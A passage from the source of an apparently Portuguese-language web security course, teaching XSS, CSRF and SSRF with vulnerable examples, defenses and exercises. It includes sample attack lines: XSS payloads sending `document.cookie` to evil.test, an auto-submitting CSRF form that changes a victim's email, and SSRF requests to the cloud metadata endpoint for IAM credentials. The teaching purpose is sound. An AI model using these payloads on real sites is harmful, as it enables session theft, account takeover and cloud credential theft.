+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "XSS acontece quando um dado é inserido numa página sem ser tratado como texto, e o navegador o " +
+                "interpreta como marcação ou script. Como o script roda na origem do site, a política de mesma origem não " +
+                "o impede: ele lê o que a página mostra, faz requisições com a sessão da vítima e altera a interface. Há " +
+                "três formas: armazenado (o conteúdo malicioso é gravado, como um comentário, e servido a todos), " +
+                "refletido (vem na própria requisição, como um parâmetro de busca ecoado na página) e baseado em DOM (o " +
+                "próprio JavaScript da página pega um dado, como o fragmento da URL, e o coloca no DOM de forma " +
+                "insegura).",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "Dado é texto até prova em contrário: insira-o na página com APIs que tratam o conteúdo como texto " +
+                "(`textContent`, o escape automático dos frameworks), e trate como exceção rara e revisada qualquer " +
+                "inserção de HTML vindo de fora.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "xss.js",
+              code: [
+                "// Um renderizador de comentários no servidor (HTML em string)",
+                "const escapeHtml = (text) =>",
+                "  String(text).replace(/[&<>\"']/g, (c) => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\", '\"': \"&quot;\", \"'\": \"&#39;\" })[c]);",
+                "",
+                "const comment = { author: \"visitante\", body: '<img src=x onerror=\"fetch(\\'https://evil.test/?c=\\'+document.cookie)\">' };",
+                "",
+                "// Vulnerável: o corpo entra como HTML — todo mundo que abrir a página executa o onerror",
+                "const renderWrong = (c) => `<li><b>${c.author}</b>: ${c.body}</li>`;",
+                "",
+                "// Seguro: o corpo entra como texto",
+                "const render = (c) => `<li><b>${escapeHtml(c.author)}</b>: ${escapeHtml(c.body)}</li>`;",
+                "",
+                "render(comment);",
+                "// '<li><b>visitante</b>: &lt;img src=x onerror=&quot;fetch(&#39;https://evil.test/?c=&#39;+document.cookie)&quot;&gt;</li>'",
+                "// o navegador mostra o texto do comentário, e não cria um <img>",
+              ].join("\n"),
+            },
+            {
+              type: "paragraph",
+              text:
+                "No navegador, a mesma regra vale para o DOM: `element.textContent = dado` insere texto; " +
+                "`element.innerHTML = dado` interpreta HTML. Frameworks como React, Vue e Angular escapam por padrão, e " +
+                "cada um tem uma porta explícita para HTML cru (`dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`) que " +
+                "concentra o risco.",
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "Escape por contexto em toda saída de dados vindos de fora — é a defesa principal e deve ser o padrão do template ou do framework.",
+                "Sanitização com uma biblioteca madura (como a DOMPurify) quando for preciso aceitar HTML de usuários, como num editor de texto rico.",
+                "Content Security Policy como segunda camada, para limitar o estrago se um XSS escapar.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "Filtrar palavras como `<script>` na entrada não funciona: há dezenas de formas de executar código sem essa palavra (atributos `on*`, `javascript:`, SVG).",
+                "Escapar para HTML não protege outros contextos, como dentro de um `<script>`, de um atributo `href` ou de CSS; cada contexto tem a sua codificação.",
+                "Cookies `HttpOnly` impedem o roubo do cookie, mas não o XSS: o script ainda age na página com a sessão da vítima.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "XSS baseado em DOM",
+              context: "O servidor não faz nada de errado; o JavaScript da página é que insere o dado como HTML.",
+              code: {
+                language: "javascript",
+                filename: "dom-xss.js",
+                code: [
+                  "// Página de busca que mostra o termo vindo do fragmento da URL: /busca#<img src=x onerror=alert(1)>",
+                  "function showSearchTermWrong(container, hash) {",
+                  "  container.innerHTML = `Resultados para: ${decodeURIComponent(hash.slice(1))}`;   // interpreta HTML",
+                  "}",
+                  "",
+                  "function showSearchTerm(container, hash) {",
+                  "  container.textContent = `Resultados para: ${decodeURIComponent(hash.slice(1))}`;   // sempre texto",
+                  "}",
+                  "",
+                  "// Simulação do DOM, só para ver a diferença",
+                  "const fakeEl = { set innerHTML(v) { this.html = v; }, set textContent(v) { this.text = v; } };",
+                  "showSearchTerm(fakeEl, \"#<img src=x onerror=alert(1)>\");",
+                  "fakeEl.text;   // \"Resultados para: <img src=x onerror=alert(1)>\" — exibido, e não executado",
+                ].join("\n"),
+              },
+              explanation:
+                "O fragmento da URL (`#...`) nem chega ao servidor, então nenhuma proteção no servidor o vê. A correção é " +
+                "a mesma do servidor, aplicada no navegador: usar a API que trata o conteúdo como texto.",
+            },
+            {
+              title: "Links: `javascript:` também é código",
+              context: "Escapar o HTML não basta quando o dado vira o destino de um link.",
+              code: {
+                language: "javascript",
+                filename: "safe-href.js",
+                code: [
+                  "// Perfil com \"site pessoal\" informado pelo usuário: <a href=\"${site}\">",
+                  "const site = \"javascript:fetch('https://evil.test/?c='+document.cookie)\";   // escapar o HTML não muda nada aqui",
+                  "",
+                  "function safeHref(value) {",
+                  "  try {",
+                  "    const url = new URL(value);",
+                  "    return [\"https:\", \"http:\"].includes(url.protocol) ? url.href : \"#\";",
+                  "  } catch {",
+                  "    return \"#\";   // não é uma URL absoluta válida",
+                  "  }",
+                  "}",
+                  "",
+                  "safeHref(site);                        // \"#\"",
+                  "safeHref(\"https://ana.example.test\");  // \"https://ana.example.test/\"",
+                ].join("\n"),
+              },
+              explanation:
+                "Num atributo `href`, o risco é o esquema da URL: `javascript:` executa código ao clicar, e o escape de " +
+                "HTML não o altera. A defesa é uma lista fechada de esquemas permitidos, conferida com o parser de URL, e " +
+                "não com uma busca por texto.",
+            },
+            {
+              title: "Aceitar HTML de usuários, com sanitização",
+              context: "Um editor de texto rico precisa de negrito e links, e não de scripts.",
+              code: {
+                language: "javascript",
+                filename: "sanitize.js",
+                code: [
+                  "import DOMPurify from \"isomorphic-dompurify\";",
+                  "",
+                  "const dirty = '<p>Olá <b>mundo</b> <img src=x onerror=alert(1)> <a href=\"javascript:alert(2)\">clique</a></p>';",
+                  "",
+                  "const clean = DOMPurify.sanitize(dirty, {",
+                  "  ALLOWED_TAGS: [\"p\", \"b\", \"i\", \"a\", \"ul\", \"ol\", \"li\"],",
+                  "  ALLOWED_ATTR: [\"href\"],",
+                  "});",
+                  "// '<p>Olá <b>mundo</b>  <a>clique</a></p>' — o <img> saiu, e o href perigoso também",
+                ].join("\n"),
+              },
+              explanation:
+                "A sanitização percorre o HTML como um navegador faria e mantém só o que está na lista permitida. " +
+                "Escrever um sanitizador próprio com expressões regulares é um erro clássico; bibliotecas mantidas " +
+                "acompanham os truques que os navegadores aceitam.",
+            },
+          ],
+          exercise: {
+            problem:
+              "A página de avaliações de produtos mostra o nome e o texto de cada avaliação montando HTML com template " +
+              "strings. Uma avaliação com um `<script>` passou a redirecionar os visitantes para outro site.",
+            problemCode: {
+              language: "javascript",
+              filename: "reviews.js",
+              code: [
+                "function renderReviews(reviews) {",
+                "  return `<ul class=\"reviews\">${reviews",
+                "    .map((r) => `<li><strong>${r.name}</strong> (${r.stars}★)<p>${r.text}</p></li>`)",
+                "    .join(\"\")}</ul>`;",
+                "}",
+                "",
+                "const reviews = [",
+                "  { name: \"Ana\", stars: 5, text: \"Ótima caneca!\" },",
+                "  { name: \"<script>location='https://evil.test'</script>\", stars: 1, text: \"<b>ruim</b>\" },",
+                "];",
+              ].join("\n"),
+            },
+            task:
+              "Escreva uma função de escape para HTML e aplique-a a todos os dados de usuário. Garanta também que " +
+              "`stars` seja um número entre 1 e 5.",
+            hint:
+              "Escape `&`, `<`, `>`, `\"` e `'`. Mesmo campos que \"deveriam\" ser números vêm da requisição e podem " +
+              "conter texto.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "reviews.fixed.js",
+                code: [
+                  "const escapeHtml = (text) =>",
+                  "  String(text).replace(/[&<>\"']/g, (c) => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\", '\"': \"&quot;\", \"'\": \"&#39;\" })[c]);",
+                  "",
+                  "const clampStars = (value) => Math.min(5, Math.max(1, Math.round(Number(value)) || 1));",
+                  "",
+                  "function renderReviews(reviews) {",
+                  "  return `<ul class=\"reviews\">${reviews",
+                  "    .map((r) => `<li><strong>${escapeHtml(r.name)}</strong> (${clampStars(r.stars)}★)<p>${escapeHtml(r.text)}</p></li>`)",
+                  "    .join(\"\")}</ul>`;",
+                  "}",
+                  "",
+                  "renderReviews(reviews).includes(\"<script>\");   // false",
+                  "renderReviews(reviews).includes(\"&lt;script&gt;location=&#39;https://evil.test&#39;&lt;/script&gt;\");   // true",
+                  "renderReviews([{ name: \"X\", stars: \"5<img>\", text: \"\" }]).includes(\"(1★)\");   // true — não é número: vira 1",
+                ].join("\n"),
+              },
+              explanation:
+                "Todo dado de usuário passa a entrar como texto, e o nome com script aparece na tela como está escrito, " +
+                "sem executar. As estrelas, que entram fora de qualquer escape, precisaram de uma validação própria: o " +
+                "campo é um número, e só um número pode sair dali.",
+            },
+          },
+        }),
+        concept({
+          order: 50,
+          title: "Cross-Site Request Forgery (CSRF)",
+          requires: ["Web Fundamentals / Cookies"],
+          note: "tokens anti-CSRF, SameSite",
+          summary:
+            "Um ataque em que outro site faz o navegador da vítima enviar uma requisição ao seu site — e o navegador " +
+            "anexa sozinho os cookies de sessão —, executando uma ação que a pessoa não pediu, como trocar o e-mail " +
+            "ou fazer uma transferência.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "No CSRF, o atacante não rouba nada: ele faz a vítima, logada no seu site, carregar uma página dele. Essa " +
+                "página envia uma requisição ao seu site (um formulário que se submete sozinho, uma imagem, um `fetch`), " +
+                "e o navegador, como sempre, anexa os cookies do seu site. Se o servidor aceitar a ação só porque veio " +
+                "com um cookie de sessão válido, ela é executada em nome da vítima. O atacante não vê a resposta — a " +
+                "política de mesma origem impede —, mas o estrago está feito. O ataque só afeta autenticação por cookies " +
+                "(ou outra credencial que o navegador anexe sozinho); APIs que exigem um token no cabeçalho " +
+                "`Authorization` não são alcançadas.",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "A pergunta que o servidor precisa responder é \"esta requisição veio do meu próprio site?\" — o cookie não " +
+                "responde, porque o navegador o anexa venha de onde vier; `SameSite`, os cabeçalhos " +
+                "`Origin`/`Sec-Fetch-Site` e um token anti-CSRF respondem.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "text",
+              filename: "attack.html",
+              code: [
+                "<!-- página em https://evil.test, aberta pela vítima logada em https://banco.test -->",
+                "<form action=\"https://banco.test/conta/email\" method=\"POST\" id=\"f\">",
+                "  <input type=\"hidden\" name=\"email\" value=\"atacante@evil.test\">",
+                "</form>",
+                "<script>document.getElementById(\"f\").submit();</script>",
+                "",
+                "O navegador envia o POST para banco.test com o cookie de sessão da vítima (se o cookie",
+                "permitir). Sem outra verificação, o e-mail da conta vira o do atacante — e, com ele,",
+                "a recuperação de senha.",
+              ].join("\n"),
+            },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "fetch-metadata.js",
+              code: [
+                "// Defesa no servidor: recusar requisições que alteram dados e vêm de outro site",
+                "const SAFE_METHODS = new Set([\"GET\", \"HEAD\", \"OPTIONS\"]);",
+                "",
+                "function rejectCrossSite(req, { allowedOrigins }) {",
+                "  if (SAFE_METHODS.has(req.method)) return null;",
+                "  const site = req.headers[\"sec-fetch-site\"];   // enviado pelos navegadores atuais",
+                "  if (site) return [\"same-origin\", \"none\"].includes(site) ? null : { status: 403, reason: `sec-fetch-site: ${site}` };",
+                "  const origin = req.headers.origin;            // alternativa em navegadores sem Fetch Metadata",
+                "  if (origin) return allowedOrigins.includes(origin) ? null : { status: 403, reason: `origin: ${origin}` };",
+                "  return { status: 403, reason: \"sem Origin nem Sec-Fetch-Site\" };   // na dúvida, recusa",
+                "}",
+                "",
+                "const opts = { allowedOrigins: [\"https://banco.test\"] };",
+                "rejectCrossSite({ method: \"POST\", headers: { \"sec-fetch-site\": \"cross-site\" } }, opts);   // { status: 403, reason: \"sec-fetch-site: cross-site\" }",
+                "rejectCrossSite({ method: \"POST\", headers: { \"sec-fetch-site\": \"same-origin\" } }, opts);  // null — segue",
+                "rejectCrossSite({ method: \"POST\", headers: { origin: \"https://banco.test\" } }, opts);     // null — segue",
+              ].join("\n"),
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "Em toda aplicação que autentica por cookie e tem ações que alteram dados: `SameSite=Lax` (ou `Strict`) no cookie de sessão como base.",
+                "Verificação de `Sec-Fetch-Site`/`Origin` no servidor para requisições que não são `GET`, como camada que não depende do cookie.",
+                "Token anti-CSRF em formulários quando o cookie precisa ser `SameSite=None` ou quando se quer proteção independente do navegador.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "APIs que só aceitam credenciais no cabeçalho `Authorization`, e não em cookies, não precisam de proteção contra CSRF.",
+                "Nenhuma defesa contra CSRF adianta se houver XSS: um script na própria página envia requisições \"do mesmo site\", com token e tudo.",
+                "Ações que alteram dados feitas por `GET` escapam do `SameSite=Lax` e das checagens por método; `GET` deve ser sempre seguro.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "O `GET` que altera dados",
+              context: "`SameSite=Lax` ainda envia o cookie em navegações de nível superior com `GET`.",
+              code: {
+                language: "javascript",
+                filename: "unsafe-get.js",
+                code: [
+                  "// Errado: um link basta para executar a ação",
+                  "// <a href=\"https://loja.test/carrinho/esvaziar\">ver promoção</a>   ← em qualquer site",
+                  "app.get(\"/carrinho/esvaziar\", (req, res) => { /* esvazia */ });",
+                  "",
+                  "// Certo: ações que alteram estado usam métodos não seguros, que passam pelas defesas",
+                  "app.post(\"/carrinho/esvaziar\", (req, res) => { /* esvazia, depois de conferir a origem */ });",
+                ].join("\n"),
+              },
+              explanation:
+                "O `SameSite=Lax` bloqueia o cookie em formulários `POST` e em requisições de fundo vindas de outros " +
+                "sites, mas não em links clicados. Manter os `GET`s sem efeito colateral — como o próprio HTTP pede — é o " +
+                "que faz as outras defesas funcionarem.",
+            },
+            {
+              title: "Double submit cookie",
+              context: "Uma alternativa sem estado no servidor: o mesmo valor aleatório no cookie e no cabeçalho.",
+              code: {
+                language: "javascript",
+                filename: "double-submit.js",
+                code: [
+                  "import { randomBytes, timingSafeEqual } from \"node:crypto\";",
+                  "",
+                  "// Ao abrir o site: um cookie legível pelo JavaScript da própria página (não HttpOnly), com valor aleatório",
+                  "const csrfCookie = randomBytes(32).toString(\"base64url\");",
+                  "// Set-Cookie: csrf=<valor>; Secure; SameSite=Lax; Path=/",
+                  "",
+                  "// O front-end copia o valor do cookie num cabeçalho em cada requisição que altera dados;",
+                  "// um site de outra origem não consegue ler o cookie, então não consegue copiar o valor",
+                  "function checkDoubleSubmit(req) {",
+                  "  const cookie = Buffer.from(req.cookies.csrf ?? \"\");",
+                  "  const header = Buffer.from(req.headers[\"x-csrf-token\"] ?? \"\");",
+                  "  return cookie.length > 0 && cookie.length === header.length && timingSafeEqual(cookie, header);",
+                  "}",
+                  "",
+                  "checkDoubleSubmit({ cookies: { csrf: csrfCookie }, headers: { \"x-csrf-token\": csrfCookie } });   // true",
+                  "checkDoubleSubmit({ cookies: { csrf: csrfCookie }, headers: {} });                              // false — o outro site não sabe o valor",
+                ].join("\n"),
+              },
+              explanation:
+                "O ataque consegue fazer o navegador enviar o cookie, mas não consegue ler o seu valor para repeti-lo no " +
+                "cabeçalho. A variante recomendada assina o valor com um segredo do servidor e o liga à sessão, para que " +
+                "um subdomínio comprometido não consiga plantar um cookie conhecido.",
+            },
+            {
+              title: "Por que o `Authorization: Bearer` não sofre CSRF",
+              context: "A diferença está em quem anexa a credencial.",
+              code: {
+                language: "text",
+                filename: "bearer-vs-cookie.txt",
+                code: [
+                  "Cookie de sessão       o NAVEGADOR anexa sozinho, em requisições de qualquer origem",
+                  "                       (limitado por SameSite) → vulnerável a CSRF",
+                  "",
+                  "Authorization: Bearer  o CÓDIGO da página anexa, lendo o token de onde o guardou;",
+                  "                       um site de outra origem não tem o token e não consegue anexá-lo",
+                  "                       → CSRF não se aplica (mas XSS, sim: o script da própria página tem o token)",
+                ].join("\n"),
+              },
+              explanation:
+                "CSRF explora credenciais que acompanham a requisição automaticamente. Credenciais que o próprio código " +
+                "precisa colocar não são alcançadas por outro site — o que não torna os tokens mais seguros em geral, só " +
+                "muda o ataque com que é preciso se preocupar.",
+            },
+          ],
+          exercise: {
+            problem:
+              "Um painel administrativo autentica por cookie de sessão com `SameSite=None` (ele é embutido num portal " +
+              "de outro domínio). As rotas de alteração não têm nenhuma proteção contra CSRF.",
+            problemCode: {
+              language: "javascript",
+              filename: "admin-panel.js",
+              code: [
+                "function handle(req, { sessions }) {",
+                "  const session = sessions.get(req.cookies.sid);",
+                "  if (!session) return { status: 401 };",
+                "  if (req.method === \"POST\" && req.path === \"/users/promote\") {",
+                "    return { status: 200, promoted: req.body.userId };   // qualquer site pode disparar isto",
+                "  }",
+                "  return { status: 404 };",
+                "}",
+              ].join("\n"),
+            },
+            task:
+              "Proteja as requisições que alteram dados com um token anti-CSRF ligado à sessão e com a checagem de " +
+              "origem, aceitando o portal parceiro como origem permitida.",
+            hint:
+              "Guarde um token aleatório na sessão, entregue-o à página e exija-o num cabeçalho. Combine com a " +
+              "verificação de `Origin` contra uma lista que inclui o portal.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "admin-panel.fixed.js",
+                code: [
+                  "import { randomBytes, timingSafeEqual } from \"node:crypto\";",
+                  "",
+                  "const ALLOWED_ORIGINS = [\"https://admin.devatlas.test\", \"https://portal.parceiro.test\"];",
+                  "",
+                  "function issueCsrfToken(session) {",
+                  "  session.csrf ??= randomBytes(32).toString(\"base64url\");",
+                  "  return session.csrf;",
+                  "}",
+                  "",
+                  "function csrfOk(req, session) {",
+                  "  if (!ALLOWED_ORIGINS.includes(req.headers.origin)) return false;",
+                  "  const sent = Buffer.from(req.headers[\"x-csrf-token\"] ?? \"\");",
+                  "  const expected = Buffer.from(session.csrf ?? \"\");",
+                  "  return expected.length > 0 && sent.length === expected.length && timingSafeEqual(sent, expected);",
+                  "}",
+                  "",
+                  "function handle(req, { sessions }) {",
+                  "  const session = sessions.get(req.cookies.sid);",
+                  "  if (!session) return { status: 401 };",
+                  "  if (req.method !== \"GET\" && !csrfOk(req, session)) return { status: 403, error: \"csrf\" };",
+                  "  if (req.method === \"POST\" && req.path === \"/users/promote\") return { status: 200, promoted: req.body.userId };",
+                  "  return { status: 404 };",
+                  "}",
+                  "",
+                  "const sessions = new Map([[\"s1\", { userId: 1 }]]);",
+                  "const token = issueCsrfToken(sessions.get(\"s1\"));",
+                  "const base = { method: \"POST\", path: \"/users/promote\", cookies: { sid: \"s1\" }, body: { userId: 9 } };",
+                  "handle({ ...base, headers: { origin: \"https://evil.test\", \"x-csrf-token\": token } }, { sessions }).status;   // 403",
+                  "handle({ ...base, headers: { origin: \"https://portal.parceiro.test\" } }, { sessions }).status;               // 403 — sem token",
+                  "handle({ ...base, headers: { origin: \"https://portal.parceiro.test\", \"x-csrf-token\": token } }, { sessions }).status;   // 200",
+                ].join("\n"),
+              },
+              explanation:
+                "Com `SameSite=None`, o cookie vai em requisições de qualquer site, e só o servidor pode separar as " +
+                "legítimas. A origem limita de onde as requisições podem vir, e o token prova que quem enviou recebeu uma " +
+                "página do próprio painel. As duas juntas fecham o caminho que o cookie deixava aberto.",
+            },
+          },
+        }),
+        concept({
+          order: 60,
+          title: "Server-Side Request Forgery (SSRF)",
+          note: "relevante em cloud (metadata endpoint) — liga com Cloud Security",
+          summary:
+            "Uma falha em que o servidor, ao buscar uma URL informada pelo usuário (pré-visualização de links, " +
+            "webhooks, importação por URL), é levado a fazer requisições para destinos internos — a rede privada, " +
+            "serviços administrativos ou o endpoint de metadados da nuvem.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "Muitos recursos fazem o servidor buscar uma URL que veio de fora: gerar a pré-visualização de um link, " +
+                "baixar uma imagem por URL, entregar webhooks, importar um arquivo. Se o servidor busca qualquer URL, o " +
+                "atacante escolhe destinos que só o servidor alcança: `http://localhost:8080/admin`, serviços da rede " +
+                "interna, e, em nuvem, o serviço de metadados (`http://169.254.169.254/`), que pode devolver credenciais " +
+                "temporárias da máquina. O servidor vira um intermediário com o acesso de rede que o atacante não tem.",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "Buscar URLs informadas por usuários é uma operação perigosa por natureza: permita só destinos públicos, " +
+                "verificando o endereço IP depois da resolução de DNS e a cada redirecionamento — e, quando possível, " +
+                "faça as buscas a partir de uma rede que não alcança nada interno.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "ssrf-guard.js",
+              code: [
+                "import { BlockList, isIP } from \"node:net\";",
+                "",
+                "// Faixas que um servidor nunca deveria buscar a pedido de um usuário",
+                "const blocked = new BlockList();",
+                "for (const [net, prefix, type] of [",
+                "  [\"127.0.0.0\", 8, \"ipv4\"], [\"10.0.0.0\", 8, \"ipv4\"], [\"172.16.0.0\", 12, \"ipv4\"], [\"192.168.0.0\", 16, \"ipv4\"],",
+                "  [\"169.254.0.0\", 16, \"ipv4\"],   // link-local: inclui o endpoint de metadados da nuvem",
+                "  [\"0.0.0.0\", 8, \"ipv4\"], [\"100.64.0.0\", 10, \"ipv4\"],",
+                "  [\"::1\", 128, \"ipv6\"], [\"fc00::\", 7, \"ipv6\"], [\"fe80::\", 10, \"ipv6\"],",
+                "]) blocked.addSubnet(net, prefix, type);",
+                "",
+                "// resolve: função que traduz o nome em IPs (dns.promises.lookup em produção)",
+                "async function checkUrl(raw, { resolve }) {",
+                "  const url = new URL(raw);",
+                "  if (url.protocol !== \"https:\") return { ok: false, reason: \"só https\" };",
+                "  const addresses = isIP(url.hostname) ? [url.hostname] : await resolve(url.hostname);",
+                "  for (const address of addresses) {",
+                "    if (blocked.check(address, isIP(address) === 6 ? \"ipv6\" : \"ipv4\")) return { ok: false, reason: `endereço interno: ${address}` };",
+                "  }",
+                "  return { ok: true, addresses };   // conecte a um destes IPs, e não resolva de novo",
+                "}",
+                "",
+                "const dnsFake = async (host) => ({ \"cdn.example.test\": [\"93.184.216.34\"], \"interno.evil.test\": [\"10.0.0.5\"] })[host] ?? [];",
+                "await checkUrl(\"https://cdn.example.test/foto.jpg\", { resolve: dnsFake });   // { ok: true, addresses: [\"93.184.216.34\"] }",
+                "await checkUrl(\"https://169.254.169.254/latest/meta-data/\", { resolve: dnsFake });   // { ok: false, reason: \"endereço interno: 169.254.169.254\" }",
+                "await checkUrl(\"https://interno.evil.test/\", { resolve: dnsFake });                  // { ok: false, reason: \"endereço interno: 10.0.0.5\" }",
+              ].join("\n"),
+            },
+            {
+              type: "paragraph",
+              text:
+                "A checagem é feita sobre os IPs resolvidos, e não sobre o texto da URL: um domínio qualquer pode apontar " +
+                "para `10.0.0.5`, e o endereço pode ser escrito de várias formas (decimal, hexadecimal, IPv6). A conexão " +
+                "deve usar o IP que foi verificado; resolver o nome de novo na hora de conectar abre espaço para o DNS " +
+                "responder outro endereço (DNS rebinding).",
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "Em todo recurso que busca URLs informadas por usuários ou por integrações: pré-visualização de links, webhooks, importação por URL, geração de PDF a partir de páginas.",
+                "Junto de uma lista de domínios permitidos, quando o recurso só precisa falar com destinos conhecidos (por exemplo, um único provedor de imagens).",
+                "Com a busca feita por um serviço isolado, numa rede sem acesso aos sistemas internos, como defesa em profundidade.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "Listas de bloqueio por texto (\"não pode conter localhost\") são contornadas por outras grafias do mesmo endereço e por domínios que apontam para IPs internos.",
+                "Seguir redirecionamentos automaticamente anula a checagem: o primeiro endereço é público e o redirecionamento leva a um interno; cada salto precisa ser verificado.",
+                "A validação reduz o risco, mas não elimina: na nuvem, exigir IMDSv2 (metadados com token) e dar à máquina o menor privilégio possível limitam o que um SSRF consegue.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "Por que o endpoint de metadados é o alvo",
+              context: "Em nuvem, uma requisição simples de dentro da máquina pode devolver credenciais.",
+              code: {
+                language: "text",
+                filename: "metadata.txt",
+                code: [
+                  "Pré-visualização de links, sem proteção:",
+                  "  POST /preview  { \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" }",
+                  "  → o servidor busca e devolve o conteúdo: o nome do papel da máquina",
+                  "  POST /preview  { \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role\" }",
+                  "  → AccessKeyId, SecretAccessKey, Token — credenciais válidas da conta de nuvem",
+                  "",
+                  "Defesas na nuvem (além da validação na aplicação):",
+                  "  - IMDSv2 (AWS): exige um token obtido por PUT com cabeçalho especial, o que a maioria",
+                  "    dos SSRFs (que só fazem GET) não consegue",
+                  "  - papel da máquina com o mínimo de permissões",
+                ].join("\n"),
+              },
+              explanation:
+                "O SSRF transforma uma função inocente, como mostrar a prévia de um link, em acesso às credenciais da " +
+                "infraestrutura. É por isso que ele entrou no Top 10 e aparece como um dos riscos centrais de segurança " +
+                "em nuvem.",
+            },
+            {
+              title: "Redirecionamentos, verificados um a um",
+              context: "O endereço inicial é público, e a resposta manda para um interno.",
+              code: {
+                language: "javascript",
+                filename: "redirects.js",
+                code: [
+                  "// (usa checkUrl do exemplo anterior)",
+                  "async function safeFetch(raw, { resolve, fetch, maxRedirects = 3 }) {",
+                  "  let url = raw;",
+                  "  for (let hop = 0; hop <= maxRedirects; hop++) {",
+                  "    const check = await checkUrl(url, { resolve });",
+                  "    if (!check.ok) throw new Error(`bloqueado: ${check.reason}`);",
+                  "    const res = await fetch(url, { redirect: \"manual\" });   // não segue sozinho",
+                  "    if (![301, 302, 303, 307, 308].includes(res.status)) return res;",
+                  "    url = new URL(res.headers.location, url).href;          // o próximo salto passa pela mesma checagem",
+                  "  }",
+                  "  throw new Error(\"redirecionamentos demais\");",
+                  "}",
+                  "",
+                  "const fakeFetch = async (url) =>",
+                  "  url.startsWith(\"https://cdn.example.test\") ? { status: 302, headers: { location: \"https://169.254.169.254/\" } } : { status: 200 };",
+                  "await safeFetch(\"https://cdn.example.test/x\", { resolve: dnsFake, fetch: fakeFetch }).catch((error) => error.message);",
+                  "// \"bloqueado: endereço interno: 169.254.169.254\"",
+                ].join("\n"),
+              },
+              explanation:
+                "Com `redirect: \"manual\"`, cada `Location` volta para o código, que o verifica como se fosse a URL " +
+                "original. Um limite de saltos evita laços. Sem isso, a checagem inicial é só uma formalidade.",
+            },
+            {
+              title: "Quando dá, uma lista de permitidos",
+              context: "Se o recurso só precisa falar com poucos destinos, não há por que aceitar qualquer um.",
+              code: {
+                language: "javascript",
+                filename: "allowlist.js",
+                code: [
+                  "// Importação de avatar: só de provedores conhecidos",
+                  "const ALLOWED_HOSTS = new Set([\"avatars.githubusercontent.com\", \"lh3.googleusercontent.com\", \"gravatar.com\"]);",
+                  "",
+                  "function allowedAvatarUrl(raw) {",
+                  "  const url = new URL(raw);",
+                  "  return url.protocol === \"https:\" && ALLOWED_HOSTS.has(url.hostname) && url.port === \"\";",
+                  "}",
+                  "",
+                  "allowedAvatarUrl(\"https://gravatar.com/avatar/abc\");            // true",
+                  "allowedAvatarUrl(\"https://gravatar.com.evil.test/avatar/abc\");  // false — o hostname é outro",
+                  "allowedAvatarUrl(\"https://gravatar.com:8443/avatar/abc\");       // false — porta diferente",
+                ].join("\n"),
+              },
+              explanation:
+                "A lista de permitidos compara o `hostname` exato já extraído pelo parser, e não um prefixo do texto, o " +
+                "que evita armadilhas como `gravatar.com.evil.test`. Quando o conjunto de destinos é pequeno e conhecido, " +
+                "ela é mais simples e mais forte que bloquear faixas de IP.",
+            },
+          ],
+          exercise: {
+            problem:
+              "O recurso de pré-visualização de links busca a URL informada e devolve o título da página. Hoje ele " +
+              "chama `fetch(url)` direto, e um teste de segurança conseguiu ler o painel interno em " +
+              "`http://localhost:9000`.",
+            problemCode: {
+              language: "javascript",
+              filename: "preview.js",
+              code: [
+                "async function preview(url, { fetch }) {",
+                "  const res = await fetch(url);",
+                "  const html = await res.text();",
+                "  return { title: /<title>([^<]*)<\\/title>/i.exec(html)?.[1] ?? null };",
+                "}",
+              ].join("\n"),
+            },
+            task:
+              "Proteja a pré-visualização: só `https`, IPs verificados depois da resolução, redirecionamentos " +
+              "verificados a cada salto, tempo e tamanho de resposta limitados. Teste com um DNS e um `fetch` falsos.",
+            hint:
+              "Reaproveite a ideia de `checkUrl` com uma `BlockList` e de `safeFetch` com `redirect: \"manual\"`. Use " +
+              "`AbortSignal.timeout` para o tempo.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "preview.fixed.js",
+                code: [
+                  "import { BlockList, isIP } from \"node:net\";",
+                  "",
+                  "const blocked = new BlockList();",
+                  "for (const [net, prefix] of [[\"127.0.0.0\", 8], [\"10.0.0.0\", 8], [\"172.16.0.0\", 12], [\"192.168.0.0\", 16], [\"169.254.0.0\", 16], [\"0.0.0.0\", 8]]) {",
+                  "  blocked.addSubnet(net, prefix, \"ipv4\");",
+                  "}",
+                  "blocked.addAddress(\"::1\", \"ipv6\");",
+                  "",
+                  "async function checkUrl(raw, resolve) {",
+                  "  const url = new URL(raw);",
+                  "  if (url.protocol !== \"https:\") throw new Error(\"só https\");",
+                  "  const ips = isIP(url.hostname) ? [url.hostname] : await resolve(url.hostname);",
+                  "  if (!ips.length || ips.some((ip) => blocked.check(ip, isIP(ip) === 6 ? \"ipv6\" : \"ipv4\"))) throw new Error(\"destino não permitido\");",
